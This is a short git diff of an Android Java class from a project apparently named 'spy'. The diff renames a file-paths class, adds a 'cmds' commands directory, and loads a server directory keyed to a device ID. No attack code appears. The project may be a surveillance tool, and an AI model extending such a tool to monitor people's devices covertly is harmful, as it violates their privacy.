@@ -1,4 +1,4 @@
-package com.gameofcoding.spy.io;
+package com.gameofcoding.spy.server.files;
 
 import android.content.Context;
 import com.gameofcoding.spy.utils.XLog;
@@ -6,23 +6,24 @@ import com.gameofcoding.spy.utils.Utils;
 import com.gameofcoding.spy.server.ServerManager;
 import java.io.File;
 
-public class ServerFilePaths implements FilePaths {
-    private static final String TAG = "ServerFilePaths";
+public class ServerFiles implements Files {
+    private static final String TAG = "ServerFiles";
+    public static final String DIR_COMMANDS = "cmds";
     public static String ROOT_DIR_NAME = "serverRootDir";
     private static ServerManager mServerManager;
 
-    private ServerFilePaths() {
+    private ServerFiles() {
     }
 
-    public static ServerFilePaths loadPaths(Context context) {
+    public static ServerFiles loadFiles(Context context) {
 	if(context == null)
 	    return null;
 	// TODO: Change getExternalFilesDir() > getFilesdir()
 	File serverRootDir = new File(context.getExternalFilesDir(null), ROOT_DIR_NAME);
 	mServerManager = new ServerManager(serverRootDir, new Utils(context).generateDeviceId());
-	if(mServerManager.loadServer() != null)
-	    return new ServerFilePaths();
-	XLog.e(TAG, "loadPath(Context): Server dir could not be loaded, aborting and returning null.");
+	if(mServerManager.loadServer(true) != null)
+	    return new ServerFiles();
+	XLog.e(TAG, "loadFiles(Context): Server dir could not be loaded, aborting and returning null.");
 	return null;
     }
 
